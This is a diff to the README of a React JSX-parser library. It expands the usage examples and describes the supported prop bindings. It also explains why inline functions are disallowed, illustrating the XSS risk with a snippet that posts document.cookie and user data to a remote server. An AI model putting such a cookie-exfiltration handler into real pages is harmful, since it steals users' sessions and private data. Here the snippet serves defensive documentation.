@@ -12,7 +12,7 @@ A React component which can parse JSX and output rendered React Components.
 ```javascript
 import React from 'react'
 import JsxParser from 'react-jsx-parser'
-import Library from 'someLibrary'
+import Library from 'some-library-of-components'
 
 class InjectableComponent extends Component {
   static defaultProps = {
@@ -24,21 +24,44 @@ class InjectableComponent extends Component {
 const MyComponent = () => (
   <JsxParser
     bindings={{
-      myEventHandler: () => { /* ... do stuff ... */ }
+      foo: 'bar',
+      myEventHandler: () => { /* ... do stuff ... */ },
     }}
     components={{ InjectableComponent, Library }}
     jsx={`
       <h1>Header</h1>
-      <InjectableComponent eventHandler={myEventHandler} />
-      <Library.SomeComponent />
+      <InjectableComponent eventHandler={myEventHandler} truthyProp />
+      <Library.SomeComponent someProp={foo} calc={1 + 1} stringProp="foo" />
     `}
   />
 )
 ```
 
-Because `InjectableComponent` is passed into the `JsxParser.props.components` prop, it is treated as a known element type, and created using `React.createElement(...)` when parsed out of the JSX.
+Because `InjectableComponent` is passed into the `JsxParser.props.components` prop, it is treated as a known element
+type, and created using `React.createElement(...)` when parsed out of the JSX. You can also pass in a whole collection
+of components, as shown by the `Library` binding, and then access the individual items with `LibraryName.ComponentName`.
 
-You can also pass a set of components into the `JsxParser.props.components` prop, and use it in JSX with dot notation.
+Finally, a note about property bindings. The `JsxParser` can handle several types of binding:
+ - implicit `true` bindings, such as `<InjectableComponent truthyProp />` (equivalent to `truthyProp={true}`)
+ - string-value binding, such as `stringProp="foo"`
+ - expression-binding, such as `calc={1 + 1}`
+ - named-value binding, such as `eventHandler={myEventHandler}` (note that this requires a match in `bindings`)
+
+The component **_does not_** support inline function declarations, such as:
+ - `onClick={function (event) { /* do stuff */ }}`, or
+ - `onKeyPress={event => { /* do stuff */}}`
+
+This is to prevent inadvertent XSS attack vectors. Since the primary use of this component is to allow JSX to be stored server-side, and then late-interpreted at the client-side, this restriction prevents a malicious user from stealing info by executing a situation like:
+```javascript
+<JsxParser
+  bindings={{ userInfo: { private: 'data' } }}
+  onClick={() => {
+    fetch('/some/remote/server', {
+      body: JSON.stringify({ cookies: document.cookie, userInfo })
+    })
+  }}
+/>
+```
 
 ## Advanced Usage - Injecting Dynamic JSX
 ```javascript
